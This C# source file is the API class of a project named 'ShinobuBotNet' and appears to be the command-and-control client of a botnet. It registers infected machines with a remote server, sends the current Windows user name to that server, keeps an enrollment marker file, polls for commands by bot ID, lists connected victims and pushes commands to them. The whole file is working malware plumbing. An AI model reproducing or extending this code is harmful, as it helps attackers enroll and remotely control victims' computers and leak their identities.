﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.IO;
namespace ShinobuBotNet
{
    class API
    {
        public static string Get_ID()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string id = wc.DownloadString(config.server + "GetID.php");
            return id;
        }

        public static void connect()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            string result = wc.DownloadString(config.server + "connect.php?user=" + userName);
        }

        public static string cheak_connect()
        {
            if (File.Exists(config.CheakFile))
            {
                return "yes";
            }

            else
            {
                return "no";
            }
        }

        public static void creat_cheak_File()
        {
            File.Create(config.CheakFile);
        }

        public static void delete_check_file()
        {
            System.IO.File.Delete(config.CheakFileFull);
        }

        public static string GetCommand(string id)
        {
            string html = web.GetHTML(config.server + "getcommand.php?id=" + id);
            return html;
        }

        public static string GetUsers()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string list = wc.DownloadString(config.server + "getusers.php");
            return list;
        }
        public static string SendCommand(string id, string type, string content)
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            if(content == null)
            {
                string result = wc.DownloadString(config.server + "sendcommand.php?id=" + id + "&type=" + type);
                return result;
            }
            else
            {
                string result = wc.DownloadString(config.server + "sendcommand.php?id=" + id + "&type=" + type + "&content=" + content);
                return result;
            }
        
        }
    }
}
